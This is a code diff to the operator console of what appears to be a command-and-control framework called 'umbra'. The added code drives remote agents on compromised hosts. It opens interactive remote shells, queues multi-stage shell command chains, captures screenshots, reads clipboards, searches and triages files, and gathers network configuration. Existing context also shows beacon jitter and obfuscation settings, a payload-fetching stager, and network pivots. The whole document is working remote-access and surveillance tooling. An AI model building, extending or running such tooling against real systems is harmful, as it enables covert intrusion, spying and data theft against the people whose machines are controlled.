@@ -18,10 +18,11 @@ import json
 import os
 import shlex
 import sys
+import threading
 import time
 from typing import Any, Dict, List, Optional
 
-from . import __version__, crypto, db, netio, wire
+from . import __version__, crypto, db, image, netio, wire
 from .client import CHUNK_MAX, OperatorClient, OperatorError
 from .vpn import print_pivots, print_vpn_peers, print_vpn_status
 
@@ -198,6 +199,40 @@ def print_tasks(tasks: List[Dict[str, Any]]) -> None:
             ]
         )
     print(table(["TASK", "KIND", "STATE", "CLAIMED BY", "CODE", "OUTPUT", "CREATED"], rows))
+
+
+def print_alerts(rules: List[Dict[str, Any]]) -> None:
+    if not rules:
+        print("the server has no alert rules")
+        return
+    rows = [
+        [
+            r.get("name", "?"),
+            r.get("event", "?"),
+            r.get("tag", "-") or "-",
+            r.get("agent", "-") or "-",
+            r.get("task_kind", "-") or "-",
+            f"{r.get('cooldown_s', 0)}s",
+        ]
+        for r in rules
+    ]
+    print(table(["NAME", "EVENT", "TAG", "AGENT", "KIND", "COOLDOWN"], rows))
+
+
+def run_task_and_wait(client: OperatorClient, console: Console, agent_id: str,
+                      kind: str, task_args: Dict[str, Any], wait: bool,
+                      timeout: float, as_json: bool) -> None:
+    """Queue a task and, when asked, wait for its result."""
+    task_id = client.submit(agent_id, kind, task_args)
+    console.note_task(task_id, agent_id, kind, task_args)
+    if as_json and not wait:
+        emit({"task_id": task_id, "agent": agent_id, "kind": kind})
+    else:
+        print(f"queued {task_id}")
+    if wait:
+        result = client.wait_for_result(task_id, timeout=timeout)
+        console.note_result(task_id, result)
+        emit(result) if as_json else print_task_result(result)
 
 
 def print_task_result(task: Dict[str, Any]) -> None:
@@ -442,6 +477,47 @@ class Console:
                 # `agents state=online tag=dc` narrows the inventory with the
                 # same filter language the server understands.
                 print_agents(self.client.agents(**parse_filter(" ".join(rest))))
+            elif cmd == "alerts":
+                print_alerts(self.client.alerts())
+            elif cmd == "triage":
+                if not rest:
+                    print("usage: triage <path>")
+                    return True
+                task_id = self.client.submit(self.target(), "triage", {"path": rest[0]})
+                self.note_task(task_id, self.target(), "triage", {"path": rest[0]})
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "find":
+                options = parse_filter(" ".join(rest))
+                path = options.pop("path", ".")
+                content = options.pop("content", "")
+                name = rest[0] if rest else ""
+                task_id = self.client.submit(self.target(), "find",
+                                             {"path": path, "name": name, "content": content})
+                self.note_task(task_id, self.target(), "find", {"path": path, "name": name})
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "netinfo":
+                task_id = self.client.submit(self.target(), "netinfo", {})
+                self.note_task(task_id, self.target(), "netinfo", {})
+                print_task_result(self.client.wait_for_result(task_id))
+            elif cmd == "chain":
+                # chain <agent> shell:{"cmd":"id"} shell:{"cmd":"cat {{output}}"}
+                if not rest:
+                    print("usage: chain <agent> <kind>:<json> ...")
+                    return True
+                stages = []
+                for item in rest[1:]:
+                    kind, _, raw = item.partition(":")
+                    args = json.loads(raw) if raw.strip() else {}
+                    stages.append({"kind": kind, "args": args})
+                data = self.client.submit_chain(rest[0], stages)
+                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
+            elif cmd == "session":
+                # session [cmd] -- an interactive shell on the selected agent.
+                opened = self.client.open_session(self.target(),
+                                                   rest[0] if rest else "")
+                task_id = str(opened.get("task_id", ""))
+                print(f"session task {task_id} queued (type to send, ctrl-c to stop)")
+                stream_session(self.client, self, self.target(), task_id, 300.0)
             elif cmd == "tag":
                 if len(rest) < 2:
                     print("usage: tag <agent> <label>...")
@@ -753,6 +829,12 @@ def print_help() -> None:
   help                      show this help
   agents | ls [filter]      list agents (state=online, tag=dc, ...)
   tag <agent> <label>       label an agent
+  session [cmd]            open an interactive session
+  chain <agent> k:{...}    queue a multi-stage task
+  triage <path>            triage a file on the agent
+  find <name>              search for files on the agent
+  netinfo                  the network configuration of the agent
+  alerts                   the alert rules of the server
   policy <agent> sleep=60   push the beacon cadence
   whoami | me               your identity, role and allowed commands
   operators                 list connected operator consoles
@@ -787,6 +869,90 @@ def print_help() -> None:
   raw <cmd> [json]          send a raw RPC
   quit                      disconnect and exit"""
     )
+
+
+def wait_for_session_id(client: OperatorClient, task_id: str, timeout: float) -> str:
+    """Wait for the id of an open session.
+
+    The id travels with the first output chunk, so the operator can address
+    the session before it produced anything.
+    """
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        event = client.next_event(timeout=1.0)
+        if event is None:
+            continue
+        if event.get("kind") == "task.output" and event.get("task_id") == task_id:
+            data = event.get("data") or {}
+            meta = data.get("meta") or {}
+            if meta.get("session"):
+                return str(meta["session"])
+    return ""
+
+
+def stream_session(client: OperatorClient, console: Console, agent_id: str,
+                   task_id: str, timeout: float) -> None:
+    """Type into a session and print what comes back.
+
+    The output arrives as `task.output` events, so a reader thread prints it
+    while the main thread reads the operator's input.
+    """
+    state = {"session": "", "stop": False}
+    pending: List[str] = []
+    lock = threading.Lock()
+
+    def send(line: str) -> None:
+        try:
+            client.session_input(agent_id, state["session"], line.encode())
+        except OperatorError as exc:
+            print(f"session write failed: {exc}", file=sys.stderr)
+
+    def pump() -> None:
+        deadline = time.time() + timeout
+        while not state["stop"] and time.time() < deadline:
+            event = client.next_event(timeout=0.5)
+            if event is None:
+                continue
+            kind = event.get("kind", "")
+            if kind == "task.output" and event.get("task_id") == task_id:
+                data = event.get("data") or {}
+                meta = data.get("meta") or {}
+                if not state["session"] and meta.get("session"):
+                    state["session"] = str(meta["session"])
+                    # The lines that were typed before the session was ready
+                    # go out now.
+                    with lock:
+                        waiting = list(pending)
+                        pending.clear()
+                    for line in waiting:
+                        send(line)
+                text = data.get("output")
+                if text:
+                    sys.stdout.write(text)
+                    sys.stdout.flush()
+            elif kind == "task.result" and event.get("task_id") == task_id:
+                break
+
+    worker = threading.Thread(target=pump, daemon=True)
+    worker.start()
+    try:
+        for line in sys.stdin:
+            with lock:
+                ready = bool(state["session"])
+                if not ready:
+                    pending.append(line)
+            if ready:
+                send(line)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        state["stop"] = True
+        worker.join(timeout=2.0)
+    if state["session"]:
+        try:
+            client.close_session(agent_id, state["session"])
+        except OperatorError:
+            pass
 
 
 def parse_filter(text: str) -> Dict[str, str]:
@@ -1136,6 +1302,58 @@ def build_parser() -> argparse.ArgumentParser:
     stager.add_argument("--url", default="", help="url the stager downloads from")
     stager.add_argument("--sha256", default="", help="sha256 of the payload the stager fetches")
     stager.add_argument("--agent-id", default="", help="agent id to bake into the stager")
+
+    # -- interactive sessions ---------------------------------------------
+    session = sub.add_parser("session", help="open an interactive session on an agent")
+    session.add_argument("agent")
+    session.add_argument("--cmd", dest="shell_cmd", default="",
+                         help="the command to run (empty starts the platform shell)")
+    session.add_argument("--input", dest="input_text", default="",
+                         help="write one line and wait for the result")
+    session.add_argument("--timeout", type=float, default=300.0)
+
+    # -- multi-stage tasks -------------------------------------------------
+    chain = sub.add_parser("chain", help="queue a multi-stage task")
+    chain.add_argument("agent")
+    chain.add_argument("--stages", default="[]",
+                       help='the stages as JSON: [{"kind":"shell","args":{"cmd":"id"}}]')
+    chain.add_argument("--wait", action="store_true")
+    chain.add_argument("--timeout", type=float, default=300.0)
+
+    # -- alerts ------------------------------------------------------------
+    alerts = sub.add_parser("alerts", help="the alert rules of the server")
+
+    # -- the operator's own desktop ---------------------------------------
+    shot = sub.add_parser("screenshot", help="capture the screen of an agent")
+    shot.add_argument("agent")
+    shot.add_argument("file", nargs="?", default="", help="where to write the png")
+    shot.add_argument("--timeout", type=float, default=120.0)
+
+    clip = sub.add_parser("clipboard", help="read the clipboard of an agent")
+    clip.add_argument("agent")
+    clip.add_argument("--wait", action="store_true")
+    clip.add_argument("--timeout", type=float, default=120.0)
+
+    # -- file triage and search -------------------------------------------
+    triage = sub.add_parser("triage", help="triage a file on an agent")
+    triage.add_argument("agent")
+    triage.add_argument("path")
+    triage.add_argument("--wait", action="store_true")
+    triage.add_argument("--timeout", type=float, default=120.0)
+
+    find = sub.add_parser("find", help="search for files on an agent")
+    find.add_argument("agent")
+    find.add_argument("name", nargs="?", default="", help="the name filter (a glob or a substring)")
+    find.add_argument("--content", default="", help="also look for this text in the files")
+    find.add_argument("--path", default=".", help="where to start the search")
+    find.add_argument("--max", type=int, default=200)
+    find.add_argument("--wait", action="store_true")
+    find.add_argument("--timeout", type=float, default=300.0)
+
+    netinfo = sub.add_parser("netinfo", help="the network configuration of an agent")
+    netinfo.add_argument("agent")
+    netinfo.add_argument("--wait", action="store_true")
+    netinfo.add_argument("--timeout", type=float, default=120.0)
 
     # -- beacon policy ----------------------------------------------------
     policy = sub.add_parser("policy", help="push the cadence to one or many agents")
@@ -1547,6 +1765,85 @@ def main(argv: Optional[List[str]] = None) -> int:
                     emit({"task_id": task_id, "name": args.name, "agent": args.agent})
                 else:
                     print(f"queued {task_id} ({args.name} on {args.agent})")
+        elif args.cmd == "session":
+            opened = client.open_session(args.agent, args.shell_cmd)
+            task_id = str(opened.get("task_id", ""))
+            console.note_task(task_id, args.agent, "session.open", {"cmd": args.shell_cmd})
+            if args.json:
+                emit(opened)
+            else:
+                print(f"session task {task_id} queued")
+            if args.input_text:
+                session_id = wait_for_session_id(client, task_id, args.timeout)
+                if session_id:
+                    client.session_input(args.agent, session_id,
+                                         (args.input_text + "\n").encode())
+                result = client.wait_for_result(task_id, timeout=args.timeout)
+                console.note_result(task_id, result)
+                emit(result) if args.json else print_task_result(result)
+            elif not args.json:
+                stream_session(client, console, args.agent, task_id, args.timeout)
+        elif args.cmd == "chain":
+            try:
+                stages = json.loads(args.stages)
+            except json.JSONDecodeError as exc:
+                print(f"invalid --stages json: {exc}", file=sys.stderr)
+                return 2
+            if not isinstance(stages, list) or not stages:
+                print("a chain needs at least one stage", file=sys.stderr)
+                return 2
+            data = client.submit_chain(args.agent, stages)
+            task_id = str(data.get("task_id", ""))
+            console.note_task(task_id, args.agent, "chain", {"stages": stages})
+            if args.json:
+                emit(data)
+            else:
+                print(f"chain {data.get('chain_id', '?')} queued ({len(stages)} stages)")
+            if args.wait and task_id:
+                result = client.wait_for_result(task_id, timeout=args.timeout)
+                console.note_result(task_id, result)
+                emit(result) if args.json else print_task_result(result)
+        elif args.cmd == "alerts":
+            rows = client.alerts()
+            emit(rows) if args.json else print_alerts(rows)
+        elif args.cmd == "screenshot":
+            task_id = client.submit(args.agent, "screenshot", {})
+            console.note_task(task_id, args.agent, "screenshot", {})
+            result = client.wait_for_result(task_id, timeout=args.timeout)
+            console.note_result(task_id, result)
+            raw = result.get("out", b"")
+            if isinstance(raw, str):
+                raw = raw.encode()
+            if not raw:
+                print("the agent returned no image", file=sys.stderr)
+                return 1
+            try:
+                png = image.bmp_to_png(bytes(raw))
+            except ValueError as exc:
+                print(f"the image could not be converted: {exc}", file=sys.stderr)
+                return 1
+            target = args.file or f"screenshot-{args.agent}.png"
+            with open(target, "wb") as handle:
+                handle.write(png)
+            if args.json:
+                emit({"task_id": task_id, "agent": args.agent, "file": target,
+                      "bytes": len(png)})
+            else:
+                print(f"{target} ({len(png)} bytes)")
+        elif args.cmd == "clipboard":
+            run_task_and_wait(client, console, args.agent, "clipboard", {},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "triage":
+            run_task_and_wait(client, console, args.agent, "triage", {"path": args.path},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "find":
+            run_task_and_wait(client, console, args.agent, "find",
+                              {"path": args.path, "name": args.name,
+                               "content": args.content, "max": args.max},
+                              args.wait, args.timeout, args.json)
+        elif args.cmd == "netinfo":
+            run_task_and_wait(client, console, args.agent, "netinfo", {},
+                              args.wait, args.timeout, args.json)
         elif args.cmd == "policy":
             if args.sleep <= 0 and args.jitter <= 0 and args.obfuscate is None:
                 print("usage: umbra policy <agent> --sleep N --jitter P "
